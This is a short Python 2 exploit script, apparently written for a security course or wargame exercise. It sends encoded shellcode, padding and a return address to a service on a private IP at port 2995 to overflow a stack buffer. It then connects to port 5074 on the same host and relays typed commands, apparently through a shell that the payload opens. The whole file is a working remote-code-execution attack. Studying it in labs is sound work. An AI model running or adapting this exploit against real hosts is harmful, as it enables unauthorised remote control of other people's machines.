#!/usr/bin/env python2
import sys
import socket
import traceback
import urllib
import struct
import time

####

## You might find it useful to define variables that store various
## stack or function addresses from the zookd / zookfs processes,
## which you can then use in build_exploit(); the following are just
## examples.

host = "192.168.209.158"
port = 2995
stack_retaddr = "\x5f\x8d\x04\x08"
junk = "A"*306

shellcode = "\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x5f\x81\xef\xdf\xff\xff\xff\x57\x5e\x29\xc9\x80\xc1\xb8\x8a\x07\x2c\x41\xc0\xe0\x04\x47\x02\x07\x2c\x41\x88\x06\x46\x47\x49\xe2\xedDBMAFAEAIJMDFAEAFAIJOBLAGGMNIADBNCFCGGGIBDNCEDGGFDIJOBGKBAFBFAIJOBLAGGMNIAEAIJEECEAEEDEDLAGGMNIAIDMEAMFCFCEDLAGGMNIAJDIJNBLADPMNIAEBIAPJADHFPGFCGIGOCPHDGIGICPCPGCGJIJODFCFDIJOBLAALMNIA"

newline = "\n"


def send_req(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    req = shellcode+junk+stack_retaddr+newline
    sock.send(req)

    print("Request sent, waiting for reply...")

try:
    send_req(host,port)
    time.sleep(2)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, 5074))
    sock.connect((host, 5074))
   
    req = raw_input("Please enter your request:")
    while req:
         print(req)
         sock.send(req+newline)
         print(sock.recv(1024))
         req = raw_input("Please enter your request:")

except:
    print("Exception:")
    print(traceback.format_exc())

